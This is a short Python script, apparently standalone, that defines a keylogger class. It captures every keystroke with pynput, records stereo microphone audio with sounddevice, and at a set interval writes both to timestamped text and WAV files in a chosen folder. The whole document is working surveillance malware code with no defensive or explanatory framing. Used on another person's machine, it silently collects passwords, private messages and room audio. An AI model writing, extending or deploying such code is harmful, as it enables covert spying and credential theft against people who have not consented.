import argparse
import os
import threading
import time

import numpy as np
import sounddevice as sd
import soundfile as wav
from pynput import keyboard


class KeyLogger:
    def __init__(self, time_interval):
        self.fs = 44100
        self.interval = time_interval
        self.log = ""
        self.recording = np.array([])

    def logging(self, string):
        self.log = self.log + string

    def report(self):
        if self.log != "":
            with open('log-' + time.strftime("%Y-%m-%d-%H-%M-%S", time.localtime()) + '.txt', 'w') as f:
                f.write(self.log)
            wav.write('log-' + time.strftime("%Y-%m-%d-%H-%M-%S", time.localtime()) + '.wav', self.recording * 5,
                      self.fs)
        self.log = ""
        self.recording = np.array([])
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "<space>"
            elif key == key.esc:
                current_key = "<ESC>"
            else:
                current_key = ""

        self.logging(current_key)

    def microphone(self):
        seconds = self.interval
        self.recording = sd.rec(int(seconds * self.fs), samplerate=self.fs, channels=2)
        sd.wait()

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.microphone()
            self.report()
            keyboard_listener.join()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--path", "-p", type=str)
    parser.add_argument("--interval", "-i", type=int, default=20)
    args = parser.parse_args()
    os.chdir(args.path)
    keylogger = KeyLogger(args.interval)
    keylogger.run()
